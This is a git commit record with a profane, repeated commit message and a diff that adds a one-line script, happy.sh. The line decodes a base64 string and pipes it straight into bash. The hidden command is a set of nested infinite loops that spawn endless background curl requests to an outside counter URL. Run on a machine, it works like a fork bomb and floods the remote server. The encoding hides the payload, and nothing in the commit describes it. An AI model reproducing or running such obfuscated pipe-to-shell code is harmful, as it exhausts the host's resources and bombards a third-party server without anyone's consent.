375cb4b8318f5cdca3ebb9a5b477067c4b09f7b2
kuwa <kuwa.com3@gmail.com>
2023-02-23 21:45:22 +0900

    fuckin haaappppyyyyyyyy
    fuckin haaappppyyyyyyyyfuckin haaappppyyyyyyyyfuckin haaappppyyyyyyyyfuckin haaappppyyyyyyyyfuckin haaappppyyyyyyyy

---
+++ happy.sh
@@ -0,0 +1,1 @@
+echo d2hpbGUgdHJ1ZTsgZG8gYmFzaCAtYyAnd2hpbGUgdHJ1ZTsgZG8gY3VybCAtcyAiaHR0cHM6Ly9zdGVsbGFjbG91ZC5uZXQvY291bnRlci9jb3VudC5waHA/dG9rZW49ZDVBblBlaHMyNGpXSDBpUiIgJiBkb25lJyAmIGRvbmU= | base64 -d | bash -
